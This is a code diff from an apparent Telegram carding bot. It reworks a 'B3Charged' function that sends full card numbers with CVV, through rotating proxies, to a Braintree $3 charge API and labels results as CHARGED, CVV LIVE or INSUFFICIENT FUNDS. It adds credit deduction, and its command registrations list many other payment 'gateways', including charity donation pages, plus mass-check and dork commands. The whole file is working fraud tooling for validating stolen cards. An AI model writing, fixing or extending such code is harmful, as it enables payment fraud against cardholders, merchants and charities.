+    # ── Validate card format ──────────────────────────────────────────────
     try:
-        # Fix proxy format
-        formatted_proxy = None
-        if proxy:
+        parts = card.split('|')
+        if len(parts) != 4:
+            return {
+                "status": "error",
+                "result": "INVALID_FORMAT",
+                "message": "Invalid format. Use: NUMBER|MM|YYYY|CVV",
+                "status_display": "⚠️ INVALID FORMAT",
+                "status_category": "error",
+                "elapsed": 0,
+                "price": "$3.00",
+                "proxy_used": proxy,
+            }
+    except Exception as e:
+        print(f"❌ [B3] Card parse error: {e}")
+        return default_result
+    
+    # ── Format proxy for API ──────────────────────────────────────────────
+    formatted_proxy = None
+    if proxy:
+        try:
             formatted_proxy = fix_b3_proxy_format(proxy)
-            print(f"🔧 Formatted proxy: {mask_proxy(formatted_proxy)}")
-        
-        # Build URL and params
-        api_url = B3CHARGED_API_URL
-        params = {'cc': card}
-        if formatted_proxy:
-            params['proxy'] = formatted_proxy
-        
-        print(f"📤 Request URL: {api_url}")
-        
+            print(f"🔧 [B3] Formatted proxy: {mask_proxy(formatted_proxy)}")
+        except Exception as e:
+            print(f"⚠️ [B3] Proxy format error: {e}")
+            formatted_proxy = None
+    
+    # ── Build request params ──────────────────────────────────────────────
+    params = {'cc': card}
+    if formatted_proxy:
+        params['proxy'] = formatted_proxy
+    
+    # ── Make HTTP request ─────────────────────────────────────────────────
+    try:
         start_time = time.time()
+        timeout_val = 30.0 if retry_count == 0 else 45.0
         
-        async with httpx.AsyncClient(timeout=45.0, verify=False, follow_redirects=True) as client:
-            response = await client.get(api_url, params=params)
+        print(f"📤 [B3] GET {API_URL}")
+        print(f"📤 [B3] Params: cc={card[:20]}... proxy={'yes' if formatted_proxy else 'no'}")
+        
+        async with httpx.AsyncClient(
+            timeout=httpx.Timeout(timeout_val, connect=10.0, read=timeout_val - 5),
+            verify=False,
+            follow_redirects=True,
+        ) as client:
+            response = await client.get(API_URL, params=params)
         
         elapsed = time.time() - start_time
-        print(f"📥 Response time: {elapsed:.2f}s")
-        print(f"📊 Status code: {response.status_code}")
+        print(f"📥 [B3] Response status: {response.status_code}")
+        print(f"📥 [B3] Response URL: {response.url}")
+        print(f"📥 [B3] Response body: {response.text[:400]}")
+        print(f"⏱️ [B3] Elapsed: {elapsed:.2f}s")
         
-        if response.status_code == 200:
-            try:
-                data = response.json()
-                print(f"✅ Response: {json.dumps(data, indent=2)}")
-                
-                status = data.get('status', 'ERROR')
-                text = data.get('text', 'Unknown')
-                price = data.get('price', '$3.00')
-                bin_code = data.get('bin', 'N/A')
-                last4 = data.get('last4', 'N/A')
-                card_display = data.get('card', card)
-                
-                # ============ DETERMINE IF PROXY IS WORKING ============
-                # These responses indicate the proxy is WORKING (card was checked)
-                working_responses = ['APPROVED', 'DECLINED']
-                # These responses indicate the proxy is DEAD
-                dead_proxy_responses = [
-                    'Failed to create account',
-                    'Connection error',
-                    'Timeout',
-                    'Proxy error',
-                    'Invalid proxy',
-                    'Proxy authentication failed'
-                ]
-                
-                is_proxy_working = status in working_responses
-                is_proxy_dead = any(err in text for err in dead_proxy_responses)
-                
-                # Mark proxy as working or dead
-                if user_id and proxy:
-                    if is_proxy_working:
-                        # Proxy is working - mark as success
-                        if hasattr(proxy_manager, 'mark_proxy_success_for_user'):
-                            proxy_manager.mark_proxy_success_for_user(user_id, proxy)
-                            print(f"✅ Proxy marked as WORKING for user {user_id}")
-                    elif is_proxy_dead and retry_count == 0:
-                        # Proxy is dead - mark as failed and retry with new proxy
-                        if hasattr(proxy_manager, 'mark_proxy_failure_for_user'):
-                            proxy_manager.mark_proxy_failure_for_user(user_id, proxy)
-                            print(f"❌ Proxy marked as DEAD for user {user_id}")
-                        
-                        # Retry with a different proxy
-                        print(f"🔄 Retrying with a different proxy...")
-                        new_proxy = get_working_proxy_for_b3(user_id, skip_proxy=proxy)
-                        if new_proxy and new_proxy != proxy:
-                            return await check_card_b3charged(card, new_proxy, user_id, retry_count + 1)
-                        else:
-                            print(f"⚠️ No alternative proxy available")
-                
-                # Map status
-                if status == 'APPROVED':
-                    status_display = "✅ APPROVED"
-                    status_category = "approved"
-                    if 'Insufficient Funds' in text:
-                        status_display = "💰 INSUFFICIENT FUNDS"
-                    elif 'CVV Mismatch' in text:
-                        status_display = "✅ CVV LIVE"
-                elif status == 'DECLINED':
-                    status_display = "❌ DECLINED"
-                    status_category = "declined"
-                else:
-                    status_display = "⚠️ ERROR"
-                    status_category = "error"
-                
-                return {
-                    "status": "success" if status in ['APPROVED', 'DECLINED'] else "error",
-                    "result": status,
-                    "message": text,
-                    "status_display": status_display,
-                    "status_category": status_category,
-                    "elapsed": elapsed,
-                    "price": price,
-                    "bin": bin_code,
-                    "last4": last4,
-                    "card_display": card_display,
-                    "proxy_used": proxy,
-                    "retryable": False
-                }
-                
-            except json.JSONDecodeError as e:
-                print(f"⚠️ JSON parse error: {e}")
-                default_result["message"] = "Invalid JSON response"
+        # ── Handle non-200 HTTP ───────────────────────────────────────────
+        if response.status_code != 200:
+            print(f"⚠️ [B3] HTTP error: {response.status_code}")
+            
+            # Retryable HTTP codes
+            if response.status_code in [408, 429, 500, 502, 503, 504] and retry_count < 2:
+                print(f"🔄 [B3] Retrying after HTTP {response.status_code}...")
+                await asyncio.sleep(2)
+                return await check_card_b3charged(card, proxy, user_id, retry_count + 1)
+            
+            # 404 specifically — the endpoint is dead
+            if response.status_code == 404:
+                print(f"❌ [B3] 404 — the Railway endpoint is down or wrong URL!")
+                default_result["message"] = "API endpoint not found (404)"
                 default_result["elapsed"] = elapsed
                 return default_result
-        else:
-            print(f"⚠️ HTTP error: {response.status_code}")
+            
             default_result["message"] = f"HTTP Error: {response.status_code}"
             default_result["elapsed"] = elapsed
             return default_result
+        
+        # ── Parse JSON response ───────────────────────────────────────────
+        try:
+            data = response.json()
+        except json.JSONDecodeError as e:
+            print(f"⚠️ [B3] JSON parse error: {e}")
+            print(f"📄 [B3] Raw response: {response.text[:200]}")
             
+            if retry_count < 2:
+                print(f"🔄 [B3] Retrying after JSON error...")
+                await asyncio.sleep(2)
+                return await check_card_b3charged(card, proxy, user_id, retry_count + 1)
+            
+            default_result["message"] = "Invalid JSON response"
+            default_result["elapsed"] = elapsed
+            return default_result
+        
+        print(f"✅ [B3] Parsed JSON: {json.dumps(data, indent=2)[:500]}")
+        
+        # ── Extract response fields ───────────────────────────────────────
+        api_status = str(data.get('status', 'ERROR')).upper().strip()
+        text = str(data.get('text', data.get('message', 'Unknown')))
+        price = data.get('price', '$3.00')
+        bin_code = str(data.get('bin', card[:6]))
+        last4 = str(data.get('last4', card[-4:]))
+        card_display = data.get('card', card)
+        text_upper = text.upper()
+        
+        # ═══════════════════════════════════════════════════════════════════
+        # DETECT PROXY HEALTH (for tracking)
+        # ═══════════════════════════════════════════════════════════════════
+        working_responses = ['APPROVED', 'DECLINED']
+        dead_proxy_responses = [
+            'failed to create account',
+            'connection error',
+            'timeout',
+            'proxy error',
+            'invalid proxy',
+            'proxy authentication failed',
+            'failed to connect',
+            'connection refused',
+        ]
+        
+        is_proxy_working = api_status in working_responses
+        is_proxy_dead = any(err in text.lower() for err in dead_proxy_responses)
+        
+        if user_id and proxy:
+            if is_proxy_working:
+                if hasattr(proxy_manager, 'mark_proxy_success_for_user'):
+                    proxy_manager.mark_proxy_success_for_user(user_id, proxy)
+                    print(f"✅ [B3] Proxy marked as WORKING for user {user_id}")
+            elif is_proxy_dead and retry_count == 0:
+                if hasattr(proxy_manager, 'mark_proxy_failure_for_user'):
+                    proxy_manager.mark_proxy_failure_for_user(user_id, proxy)
+                    print(f"❌ [B3] Proxy marked as DEAD for user {user_id}")
+                
+                # Retry with a different proxy
+                print(f"🔄 [B3] Retrying with a different proxy...")
+                new_proxy = get_working_proxy_for_b3(user_id, skip_proxy=proxy)
+                if new_proxy and new_proxy != proxy:
+                    return await check_card_b3charged(card, new_proxy, user_id, retry_count + 1)
+        
+        # ═══════════════════════════════════════════════════════════════════
+        # MAP STATUS -> DISPLAY + CATEGORY
+        # ═══════════════════════════════════════════════════════════════════
+        if api_status == 'APPROVED':
+            if 'INSUFFICIENT' in text_upper or 'FUNDS' in text_upper:
+                status_display = "💰 INSUFFICIENT FUNDS"
+                status_category = "approved"
+            elif any(k in text_upper for k in ['CVV', 'CCV', 'MISMATCH']):
+                status_display = "✅ CVV LIVE"
+                status_category = "approved"
+            elif any(k in text_upper for k in ['CHARGED', 'SUCCESS', 'PAID']):
+                status_display = "🔥 CHARGED 🔥"
+                status_category = "charged"
+            elif '3D' in text_upper or 'SECURE' in text_upper:
+                status_display = "🔐 3D REQUIRED"
+                status_category = "approved"
+            else:
+                status_display = "✅ APPROVED"
+                status_category = "approved"
+        
+        elif api_status == 'DECLINED':
+            status_display = "❌ DECLINED"
+            status_category = "declined"
+        
+        elif api_status == 'ERROR':
+            status_display = "⚠️ ERROR"
+            status_category = "error"
+        
+        else:
+            status_display = "⚠️ UNKNOWN"
+            status_category = "error"
+        
+        # ── Build final result ────────────────────────────────────────────
+        result = {
+            "status": "success" if api_status in ['APPROVED', 'DECLINED'] else "error",
+            "result": api_status,
+            "message": text,
+            "status_display": status_display,
+            "status_category": status_category,
+            "elapsed": elapsed,
+            "price": price,
+            "bin": bin_code,
+            "last4": last4,
+            "card_display": card_display,
+            "proxy_used": proxy,
+            "retryable": False,
+        }
+        
+        print(f"🎯 [B3] Final: {status_display} | category={status_category}")
+        return result
+    
+    # ── Exception handlers ────────────────────────────────────────────────
+    except httpx.TimeoutException:
+        print(f"⏰ [B3] Timeout")
+        if retry_count < 2:
+            print(f"🔄 [B3] Retrying after timeout...")
+            await asyncio.sleep(2)
+            return await check_card_b3charged(card, proxy, user_id, retry_count + 1)
+        default_result["message"] = "Request timeout"
+        return default_result
+    
+    except httpx.ConnectError as e:
+        print(f"🔌 [B3] Connection error: {e}")
+        if retry_count < 2:
+            print(f"🔄 [B3] Retrying after connection error...")
+            await asyncio.sleep(2)
+            return await check_card_b3charged(card, proxy, user_id, retry_count + 1)
+        default_result["message"] = f"Connection error: {str(e)[:50]}"
+        return default_result
+    
     except Exception as e:
-        print(f"❌ Error: {e}")
+        print(f"❌ [B3] Unexpected error: {e}")
+        import traceback
+        traceback.print_exc()
         default_result["message"] = str(e)[:100]
         return default_result
 
 
-def get_working_proxy_for_b3(user_id: int, skip_proxy: str = None) -> Optional[str]:
-    """Get a working proxy for B3 gateway, skipping the failed one"""
-    if user_id not in proxy_manager.user_proxies or not proxy_manager.user_proxies[user_id]:
-        return None
-    
-    # Get failed proxies set
-    failed_set = proxy_manager.user_failed_proxies.get(user_id, set())
-    
-    # Get all available proxies
-    available_proxies = []
-    for proxy in proxy_manager.user_proxies[user_id]:
-        if proxy not in failed_set and proxy != skip_proxy:
-            available_proxies.append(proxy)
-    
-    # If all proxies are failed, reset and try all
-    if not available_proxies:
-        print(f"🔄 All proxies failed for user {user_id}, resetting failed list")
-        proxy_manager.user_failed_proxies[user_id] = set()
-        available_proxies = [p for p in proxy_manager.user_proxies[user_id] if p != skip_proxy]
-    
-    if not available_proxies:
-        return None
-    
-    # Get next available proxy
-    idx = proxy_manager.user_proxy_index.get(user_id, 0) % len(available_proxies)
-    selected = available_proxies[idx]
-    proxy_manager.user_proxy_index[user_id] = (proxy_manager.user_proxy_index.get(user_id, 0) + 1) % len(available_proxies)
-    
-    print(f"🔄 B3 using proxy: {mask_proxy(selected)}")
-    return selected
+
+
 
 
 def format_b3charged_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
@@ -59518,16 +59908,18 @@ async def b3charged_mass_check_logic(update: Update, context: ContextTypes.DEFAU
 
 # ============ B3CHARGED COMMAND HANDLERS ============
 async def single_check_b3charged(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Single card check with B3CHARGED gateway"""
+    """Single card check with B3CHARGED gateway - /b3 <card>"""
     if not await verify_group_access(update, context):
         return
     
     if not context.args:
         await update.message.reply_text(
-            "📦 <b>B3Charged Single Check</b>\n\n"
-            "Usage: /b3 <card>\n"
-            "Example: /b3 4111111111111111|12|2025|123\n\n"
-            "This uses the BT3D API (Braintree $3 Checker)",
+            "📦 <b>B3Charged $3 - Single Check</b>\n\n"
+            "Usage: <code>/b3 &lt;card&gt;</code>\n"
+            "Example: <code>/b3 5156769827654519|09|27|475</code>\n\n"
+            "💰 Amount: $3.00 (Braintree Charge)\n"
+            "📍 Gateway: Braintree via B3Charged API\n"
+            "✅ Checks: Charged, CVV Live, Insufficient Funds, 3DS",
             parse_mode=ParseMode.HTML
         )
         return
@@ -59539,12 +59931,17 @@ async def single_check_b3charged(update: Update, context: ContextTypes.DEFAULT_T
     if not card:
         await update.message.reply_text(
             "❌ Invalid card format. Use: card|mm|yyyy|cvv\n"
-            "Example: 4111111111111111|12|2025|123"
+            "Example: 5156769827654519|09|27|475"
         )
         return
     
+    # Check credits first
+    can_proceed, error_msg = await check_and_deduct_credits(user_id, update, context, is_mass_check=False, card_count=1)
+    if not can_proceed:
+        await update.message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+        return
+    
     await b3charged_single_check_logic(update, context, card)
-
 
 async def mass_check_b3charged(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Mass card check with B3CHARGED gateway from text"""
@@ -76646,84 +77043,11 @@ def main():
     # ============ DORK FEATURE ============
     app.add_handler(CommandHandler("dork", dork_command))
     
-    # ============ GATEWAY COMMANDS ============
-    # PayPal
-    app.add_handler(CommandHandler("pp", lambda u, c: single_check_paypal_with_pool(u, c, extract_card_from_args(u, c))))
-    app.add_handler(CommandHandler("mpp", mass_check_paypal))
-    
-    # Autosopi (Shopify)
-    app.add_handler(CommandHandler("aumc", aumc_command))
-    app.add_handler(CommandHandler("auc", aumc_command))
+
     app.add_handler(CommandHandler("msh", aumc_command))
     app.add_handler(CommandHandler("sh", single_check_shopify_pool_command))
     
-    # Stripe Charge V2
-    app.add_handler(CommandHandler("sc", single_check_stripe_charge_v2))
-    app.add_handler(CommandHandler("msc", mass_check_stripe_charge_v2))
-    
-    # Stripe Charge
-    app.add_handler(CommandHandler("stc", single_check_stripe_charge_new))
-    app.add_handler(CommandHandler("stmc", mass_check_stripe_charge))
-    
-    # Stripe Auth
-    app.add_handler(CommandHandler("sta", stripe_auth_single_check_logic))
-    app.add_handler(CommandHandler("stamc", stripe_auth_mass_check_logic))
-    
-    # Razorpay
-    app.add_handler(CommandHandler("rz", single_check_razorpay))
-    app.add_handler(CommandHandler("mrz", razorpay_mass_check_with_pool))
-    
-    # Braintree
-    app.add_handler(CommandHandler("btn", single_check_braintree_advanced))
-    app.add_handler(CommandHandler("btnm", mass_check_braintree_advanced))
-    
-    # B3Charged
-    app.add_handler(CommandHandler("b3", single_check_b3charged))
-    app.add_handler(CommandHandler("mb3", mass_check_b3charged))
-    
-    # Payflow
-    app.add_handler(CommandHandler("pf", single_check_payflow_command))
-    app.add_handler(CommandHandler("pfmc", mass_check_payflow))
-    
-    # Adyen
-    app.add_handler(CommandHandler("ad", single_check_ad))
-    app.add_handler(CommandHandler("mad", mass_check_mad))
-    
-    # New Stripe API
-    app.add_handler(CommandHandler("nstripe", single_check_new_stripe))
-    app.add_handler(CommandHandler("nstripem", new_stripe_file_command))
-    
-    # STC1
-    app.add_handler(CommandHandler("stc1", single_check_stc1))
-    app.add_handler(CommandHandler("mstc", mass_check_stc1))
-    
-    # ST1
-    app.add_handler(CommandHandler("st1", single_check_st1))
-    app.add_handler(CommandHandler("mst1", mass_check_st1_command))
-    
-    # Razorpay Gate2
-    app.add_handler(CommandHandler("rp", single_check_razorpay_gate2))
-    app.add_handler(CommandHandler("mrp", mass_check_razorpay_gate2_command))
-    
-    # Adyen
-    app.add_handler(CommandHandler("ay", single_check_adyen))
-    app.add_handler(CommandHandler("may", mass_check_adyen_command))
-    
-    # Stripe Payment Link
-    app.add_handler(CommandHandler("ct", single_check_stripe_pl))
-    app.add_handler(CommandHandler("mct", mass_check_stripe_pl_command))
-    
-    # PayPal Donation
-    app.add_handler(CommandHandler("pa", single_check_paypal_donation))
-    app.add_handler(CommandHandler("mpa", mass_check_paypal_donation_command))
-    
-    # PayPal Donation 50
-    app.add_handler(CommandHandler("p", single_check_paypal_donation_50))
-    app.add_handler(CommandHandler("mp", mass_check_paypal_donation_50_command))
-    
-    # United Way Stripe
-    app.add_handler(CommandHandler("s", single_check_united_way))
-    app.add_handler(CommandHandler("ms", mass_check_united_way_command))
+
     
     # ============ PROXY COMMANDS ============
     app.add_handler(CommandHandler("myproxy", myproxy_command))
@@ -76868,25 +77192,10 @@ def main():
     app.add_handler(CallbackQueryHandler(confirm_stop_all_callback, pattern='confirm_stop_all'))
     app.add_handler(CallbackQueryHandler(confirm_stop_all_callback, pattern='cancel_stop_all'))
     
-    # ============ STRIPE AUTH 0$ COMMANDS ============
-    app.add_handler(CommandHandler("chk0", single_check_stripe_auth0))
-    app.add_handler(CommandHandler("mchk0", mass_check_stripe_auth0))
+
     
-    # ============ BOUTIQUE API COMMANDS ============
-    app.add_handler(CommandHandler("btq", single_check_boutique_api))
-    app.add_handler(CommandHandler("mbtq", mass_check_boutique_api))
     
-    # ============ EZYCOURSE COMMANDS ============
-    app.add_handler(CommandHandler("ch", single_check_ezycourse))
-    app.add_handler(CommandHandler("mch", mass_check_ezycourse))
-    
-    # ============ BRAINTREE AUTH COMMANDS ============
-    app.add_handler(CommandHandler("b3", single_check_braintree_auth))
-    app.add_handler(CommandHandler("mb3", mass_check_braintree_auth))
-    
-    # ============ GLOBAL GREEN COMMANDS ============
-    app.add_handler(CommandHandler("gg", single_check_globalgreen))
-    app.add_handler(CommandHandler("mgg", mass_check_globalgreen))
+
     
     # ============ MASS PROXY GLOBAL COMMANDS ============
     app.add_handler(CommandHandler("massglobalproxy", mass_proxy_global_command))
@@ -76896,20 +77205,14 @@ def main():
     app.add_handler(CallbackQueryHandler(rtrash_callback, pattern='confirm_rtrash'))
     app.add_handler(CallbackQueryHandler(rtrash_callback, pattern='cancel_rtrash'))
     
-    # ============ RAZORPAY2 COMMANDS ============
-    app.add_handler(CommandHandler("rz1", single_check_razorpay2))
+
     
-    # ============ PRINCESS COMMANDS ============
-    app.add_handler(CommandHandler("pp1", single_check_princess))
-    app.add_handler(CommandHandler("mpp1", mass_check_princess))
-    
+
     # ============ STRIPE CHK COMMANDS ============
     app.add_handler(CommandHandler("chk", single_check_stripe_chk))
     app.add_handler(CommandHandler("mchk", mass_check_stripe_chk_command))
     
-    # ============ STRIPE $1 COMMANDS ============
-    app.add_handler(CommandHandler("st", single_check_stripe_1usd))
-    app.add_handler(CommandHandler("mst", mass_check_stripe_1usd_command))
+
     
     # ============ WHOP COMMANDS ============
     app.add_handler(CommandHandler("whop", whop_command))
@@ -77030,6 +77333,10 @@ def main():
     
     app.add_handler(CommandHandler("g_code", g_code_command))
     app.add_handler(CommandHandler("claim", claim_command))
+    
+    app.add_handler(CommandHandler("b3", single_check_b3charged))
+    
+       
 
     
 
